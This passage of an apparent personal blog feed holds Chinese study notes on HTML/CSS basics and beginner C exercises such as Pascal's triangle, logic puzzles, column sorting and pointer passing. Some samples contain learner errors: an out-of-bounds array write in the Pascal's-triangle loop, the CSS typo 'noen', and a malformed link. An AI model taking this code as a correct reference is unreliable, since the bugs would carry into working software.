class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 以上三种选择器的优先级</span></span></span><br><span class="line"><span class="comment"><span class="language-css">id选择器&gt;类选择器&gt;标签选择器 */</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">邮箱地址：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 在HTML中，任何一个节点元素都有class属性，用来指定标签类名--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--以下虽然标签不同，但是它们的都属于同一类。为什么？因为类名相同--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>在HTML嵌入CSS样式的第三种方式<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入外部独立的CSS样式表文件--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--实际开发中较多使用这种方式，可以降低维护成本，修改一个文件即可--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;C:/Users/yxz/Desktop/css/my.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>附.css文件代码</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#div1</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#ADFF2F</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line"><span class="attribute">position</span>: absolute; <span class="comment">/* 绝对定位 */</span></span><br><span class="line"><span class="comment">/* 绝对定位的时候只要设置x轴和y轴坐标即可 */</span></span><br><span class="line"><span class="attribute">top</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">500px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#div2</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">background</span>: red;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line"><span class="attribute">position</span>: absolute; <span class="comment">/* 绝对定位 */</span></span><br><span class="line"><span class="attribute">top</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">600px</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/07/AH8Xvk5FiMraCQL.png" alt="css.png"></p><h3 id="常见CSS样式"><a href="#常见CSS样式" class="headerlink" title="常见CSS样式"></a>常见CSS样式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>常用的CSS样式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--样式块--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.numbers</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">display</span>: none; <span class="comment">/*  block */</span> </span></span><br><span class="line"><span class="language-css"><span class="comment">/* </span></span></span><br><span class="line"><span class="comment"><span class="language-css">display样式</span></span></span><br><span class="line"><span class="comment"><span class="language-css">1.属于布局样式</span></span></span><br><span class="line"><span class="comment"><span class="language-css">2.用来设置显示或者隐藏</span></span></span><br><span class="line"><span class="comment"><span class="language-css">3.隐藏：none</span></span></span><br><span class="line"><span class="comment"><span class="language-css">4.显示：block或者inline-bloc</span></span></span><br><span class="line"><span class="comment"><span class="language-css">block：以块的形式展现，并且独自占用一行</span></span></span><br><span class="line"><span class="comment"><span class="language-css">inline-block：以块的形式展现，但是不会自己独自占用一行</span></span></span><br><span class="line"><span class="comment"><span class="language-css">*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#nameError</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">font-size</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.baidu</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">text-decoration</span>: none;<span class="comment">/* underline */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#cc</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">list-style-type</span>: noen;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* :hover专门用来设置鼠标悬停效果的 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/*使用hover的时候:俩边不能出现空格*/</span></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#bgpowernode</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css"><span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.div5</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: <span class="number">#444</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">34px</span> red solid;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 在元素外边打补丁 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">margin-top</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">margin-left</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 内补丁 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">padding-right</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#outdiv</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: blue;</span></span><br><span class="line"><span class="language-css"><span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#innerdiv</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 设置当前节点元素的浮动效果，只是浮动于当前元素的父元素内部 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#mydiv2</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 绝对定位 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css"><span class="attribute">top</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">left</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置鼠标悬停效果--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--鼠标移动到以下文本上，字体颜色变红，鼠标变小手--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;bgpowernode&quot;</span>&gt;</span>柚子皮<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--无序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;cc&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>a</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;numbers&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>b</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;numbers&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>c</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;numbers&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--字体样式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;nameError&quot;</span>&gt;</span>用户名不能为空<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文本装饰--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;baidu&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http:www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--内补丁，外补丁--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div5&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--浮动效果--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;outdiv&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;innerdiv&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;mydiv2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/09/VpQUdCGtHbAniZ8.png" alt="image.png"></p><h3 id="暂停于此"><a href="#暂停于此" class="headerlink" title="暂停于此"></a>暂停于此</h3>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C的笔记</title>
      <link href="/2023/03/05/C%E7%9A%84%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/05/C%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h3><p>数组要初始化<br>找规律</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 1 1</span></span><br><span class="line"><span class="comment">// 1 2 1</span></span><br><span class="line"><span class="comment">// 1 3 3 1</span></span><br><span class="line"><span class="comment">// 1 4 6 4 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>][<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//第一列全1</span></span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                arr[i][j] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//对角线全1</span></span><br><span class="line">            <span class="keyword">if</span> (i == j)</span><br><span class="line">            &#123;</span><br><span class="line">                arr[i][j] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">2</span> &amp;&amp; j &gt;= <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                arr[i][j] = arr[i <span class="number">-1</span>][j - <span class="number">1</span>] + arr[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/CD8iWgf2mlQUz5G.png" alt="杨辉三角.png"></p><h3 id="凶杀案"><a href="#凶杀案" class="headerlink" title="凶杀案"></a>凶杀案</h3><p>A：不是我</p><p>B：是C </p><p>C：是D </p><p>D：C在胡说 </p><p>三个真话一个假话</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//假设法</span></span><br><span class="line">    <span class="comment">//1为真0为佳，竖着一组</span></span><br><span class="line">    <span class="comment">//A:0 1 1 1</span></span><br><span class="line">    <span class="comment">//B:0 0 1 0</span></span><br><span class="line">    <span class="comment">//C:0 0 0 1</span></span><br><span class="line">    <span class="comment">//D:1 1 1 0</span></span><br><span class="line">    <span class="type">int</span> killer = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (killer = <span class="string">&#x27;A&#x27;</span>; killer &lt;= <span class="string">&#x27;D&#x27;</span>; killer++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((killer !=<span class="string">&#x27;A&#x27;</span>) + (killer == <span class="string">&#x27;C&#x27;</span>) + (killer == <span class="string">&#x27;D&#x27;</span>) + (killer != <span class="string">&#x27;D&#x27;</span>) == <span class="number">3</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;凶手是%c&quot;</span>, killer);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/Y9X8EFRSamPydft.png" alt="凶手是谁.png"></p><h3 id="趣味问题"><a href="#趣味问题" class="headerlink" title="趣味问题"></a>趣味问题</h3><h4 id="燃香问题"><a href="#燃香问题" class="headerlink" title="燃香问题"></a>燃香问题</h4><p>有一根香材质不均匀，燃完一根需要1h，给你两根香，确认一个15min实践段。</p><p>将第一根香两端点燃，这样就确定了一个30min，同时将第一根香一段点燃<br>在第一根香燃烧完后，第二根香就剩30min了，这样再按照第一根香的方法就确定了15min</p><h3 id="拆名次"><a href="#拆名次" class="headerlink" title="拆名次"></a>拆名次</h3><p>A：B第二，我第三<br>B：我第二，E第四<br>C:我第一，D第二<br>D：C最后，我第三<br>E:我第四，A第一<br>每位选手都说对了一半</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> d = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (a = <span class="number">1</span>; a &lt;= <span class="number">5</span>; a++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (b = <span class="number">1</span>; b &lt;= <span class="number">5</span>; b++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (c = <span class="number">1</span>; c &lt;= <span class="number">5</span>; c++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (d = <span class="number">1</span>; d &lt;= <span class="number">5</span>; d++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> (e = <span class="number">1</span>; e &lt;= <span class="number">5</span>; e++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (((b == <span class="number">2</span>) + (a == <span class="number">3</span>) == <span class="number">1</span>)</span><br><span class="line">                        &amp;&amp; ((b == <span class="number">2</span>) + (e == <span class="number">4</span>) == <span class="number">1</span>) </span><br><span class="line">                        &amp;&amp; ((c == <span class="number">1</span>) + (d == <span class="number">2</span>) == <span class="number">1</span>) </span><br><span class="line">                        &amp;&amp; ((c == <span class="number">5</span>) + (d == <span class="number">3</span>) == <span class="number">1</span>) </span><br><span class="line">                        &amp;&amp; ((e == <span class="number">4</span>) + (a == <span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">                        )</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (a * b * c * d * e == <span class="number">120</span>)</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;a=%d b=%d c=%d d=%d e=%d \n&quot;</span>, a, b, c, d, e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/waoOR93i4FNjuSV.png" alt="排名.png"></p><h3 id="二维数组列排序"><a href="#二维数组列排序" class="headerlink" title="二维数组列排序"></a>二维数组列排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> i, j, k, b[<span class="number">20</span>][<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> m,n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;m, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,  &amp;b[i][j]);</span><br><span class="line"><span class="type">int</span> temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; m - j - <span class="number">1</span>; k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[k][i] &lt; b[k + <span class="number">1</span>][i])&#123;</span><br><span class="line">temp = b[k][i];</span><br><span class="line">b[k][i] = b[k + <span class="number">1</span>][i];</span><br><span class="line">b[k + <span class="number">1</span>][i] = temp;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/4RasZXYOAuoQJh9.png" alt="1111.png"></p><h3 id="3-7-指针"><a href="#3-7-指针" class="headerlink" title="3_7-指针"></a>3_7-指针</h3><h4 id="一级指针传参"><a href="#一级指针传参" class="headerlink" title="一级指针传参"></a>一级指针传参</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECUTE_NO_WARNIG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span>* ptr, <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *(ptr + i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span>* p)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 一级指针传参</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span 